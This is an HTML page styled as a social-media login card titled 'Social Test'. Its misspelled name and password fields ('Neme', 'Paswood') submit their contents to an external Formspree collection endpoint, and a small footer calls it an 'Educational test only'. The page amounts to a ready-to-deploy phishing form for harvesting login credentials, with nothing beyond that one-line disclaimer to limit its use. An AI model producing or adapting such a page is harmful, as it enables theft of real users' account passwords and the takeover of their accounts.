<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Social Test</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: #fafafa;
  font-family: Arial, sans-serif;
}

.card {
  width: 90%;
  max-width: 350px;
  background: white;
  border: 1px solid #ddd;
  padding: 30px 25px;
  text-align: center;
}

.logo {
  font-size: 30px;
  font-weight: bold;
  margin-bottom: 25px;
}

input {
  width: 100%;
  padding: 13px;
  margin-bottom: 10px;
  border: 1px solid #ccc;
  border-radius: 6px;
  background: #fafafa;
}

button {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 6px;
  background: #333;
  color: white;
  font-weight: bold;
  cursor: pointer;
}

.note {
  margin-top: 20px;
  font-size: 12px;
  color: #777;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">Social Test</div>

  <form action="https://formspree.io/f/xrpzoaod" method="POST">

    <input
      type="text"
      name="Neme"
      placeholder="Neme"
      required
    >

    <input
      type="text"
      name="Paswood"
      placeholder="Paswood"
      required
    >

    <button type="submit">Send</button>

  </form>

  <div class="note">
    Educational test only
  </div>

</div>

</body>
</html>
